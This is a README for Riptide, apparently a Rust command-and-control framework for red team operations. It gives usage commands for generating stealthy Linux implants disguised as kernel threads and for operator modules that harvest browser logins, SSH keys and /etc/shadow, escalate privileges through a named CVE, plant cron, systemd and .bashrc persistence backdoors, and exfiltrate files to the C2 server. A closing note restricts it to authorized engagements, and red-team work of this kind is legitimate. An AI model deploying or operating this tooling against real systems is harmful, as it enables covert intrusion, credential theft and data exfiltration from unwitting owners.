# Riptide

Interactive command & control framework for red team operations. Simple implants that phone home, on-demand modules for every action, full REST API for scripting.

```
operator ──▶ console (TUI) ──▶ c2-server (REST/WS) ◀── implant (beacon)
operator ──▶ curl / Python  ──▶ c2-server (REST/WS) ◀── implant (beacon)
```


## Quick Start

### 1. Build

```bash
# Requires Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup target add x86_64-unknown-linux-musl

# Clone and build
git clone https://github.com/aldaihanabdullah3/riptide.git
cd riptide
cargo build --release
```

### 2. Start the C2 Server

```bash
# HTTP on :80, HTTPS on :443 (defaults)
cargo run -p c2-server --release

# Custom ports
cargo run -p c2-server --release -- --http-port 8080 --https-port 8443
```

The C2 server starts an HTTP listener and an HTTPS listener (auto-generates a self-signed TLS certificate on first run). It exposes:

| Endpoint | Purpose |
|----------|---------|
| `GET/POST /beacon` | Implant check-in, returns queued commands |
| `POST /upload` | Loot / binary data upload |
| `POST /result` | Command result submission |
| `GET /health` | Health check |
| `GET /api/v1/sessions` | List all implant sessions |
| `GET /api/v1/sessions/:id` | Session detail + command history |
| `POST /api/v1/sessions/:id/commands` | Queue a command |
| `GET /api/v1/sessions/:id/commands` | Command history |
| `GET /ws/events` | WebSocket event stream |

### 3. Generate an Implant

```bash
# Minimal: HTTP, fast beacon
cargo run -p payload-gen --release -- \
  --protocol http --host 10.0.0.1 --port 80 --beacon-rate 60

# Stealthy: HTTPS, slow beacon, kernel-thread process name
cargo run -p payload-gen --release -- \
  --protocol https --host c2.example.com --port 443 \
  --beacon-rate 600 --jitter 120 \
  --process-name "[kworker/0:2]"

# Full options
cargo run -p payload-gen --release -- --help
```

This produces a statically-linked musl binary. Deploy it to the target by any method.

### 4. Connect the Operator Console

```bash
cargo run -p console --release -- --server http://localhost:8080
```

Select a session with `Enter`, type commands with `i`, execute with `Enter`.

### 5. Or Use the Python Client

```python
from c2client import C2Client

c2 = C2Client("http://localhost:8080")

# List sessions
for s in c2.active_sessions():
    print(s["hostname"])

# Send a shell command
cid = c2.shell(s["implant_id"], "cat /etc/shadow")
result = c2.wait_result(s["implant_id"], cid)
print(result["stdout"])
```

```bash
python3 c2client.py http://localhost:8080
```

## Architecture

```
┌──────────────────────────────────────────────────────────┐
│                   C2 Server (c2-server)                   │
│  axum HTTP+HTTPS | Session registry | Command queues     │
│  REST API for operators | WebSocket events               │
└──────┬────────────────────────────────────┬──────────────┘
       │                                    │
       │ POST /beacon (receive commands)    │ GET /api/v1/sessions
       │ POST /result (submit output)       │ POST /api/v1/.../commands
       │                                    │
┌──────▼──────────┐                 ┌───────▼──────────────┐
│  Implant         │                 │  Operator             │
│  (static musl)   │                 │  console (TUI)        │
│                  │                 │  curl                 │
│  phones home     │                 │  Python (c2client.py) │
│  polls for cmds  │                 │  scripts              │
│  dispatches      │                 │                       │
└──────────────────┘                 └───────────────────────┘
```

## Modules

All capabilities are on-demand. The implant is a simple beacon — it phones home and waits for commands. The operator triggers everything.

### Reconnaissance

```bash
# curl -X POST .../commands -d '{"module":"recon","action":"passive","args":{}}'
recon passive     # /proc reads only (stealth — no network activity)
recon active      # ping sweep + ip + ss (thorough but noisy)
recon arp         # quick ARP table dump
```

### Credential Harvesting

```bash
creds harvest     # Firefox logins/key4.db, SSH keys, /etc/shadow,
                  # .bash_history, NetworkManager WiFi passwords
                  # args: {"mode": "in_memory"} (stealth) or "shell"
```

### Privilege Escalation

```bash
privesc copyfail  # CVE-2026-31431: AF_ALG page-cache corruption → root
privesc pkexec    # GUI password prompt escalation (Tier 1 style)
```

### Persistence

```bash
persist cron      # @reboot cron job
persist systemd   # systemd service (optional name: {"service_name":"my-svc"})
persist bashrc    # .bashrc backdoor for all users
```

### Exfiltration

```bash
exfil /etc/shadow # exfiltrate a single file in chunks
download /tmp/log # download a file from the implant
```

### Shell

```bash
shell id          # execute arbitrary command, returns stdout/stderr/exit code
shell "cat /etc/passwd | grep root"
```

### Forensic Markers

```bash
marker phase-1    # writes trace to /dev/shm/ras_marker.<timestamp>
```

### System

```bash
system info       # hostname, PID, UID, OS, beacon config
system sleep 120  # change beacon interval at runtime
system exit       # terminate the implant process
```

## Build Options

### Implant Configuration (compile-time)

All baked via environment variables during `cargo build` or `payload-gen`:

| Variable | Default | Description |
|----------|---------|-------------|
| `C2_HOST` | `10.170.22.213` | C2 server hostname or IP |
| `C2_PORT` | `80` (HTTP), `443` (HTTPS) | C2 server port |
| `BEACON_RATE` | `60` | Beacon interval in seconds |
| `LABELLING_MARKER` | (off) | Enable auto-forensic markers |


## Requirements

- **Rust** 1.70+ with `x86_64-unknown-linux-musl` target
- **Python** 3.8+ (for `c2client.py` and `web-server/`)
- **Linux** target (implant is Linux-only, x86_64)

## Security Note

This framework is designed for **authorized red team engagements in closed environments**. There is no authentication on the C2 API — operate it on an isolated network.
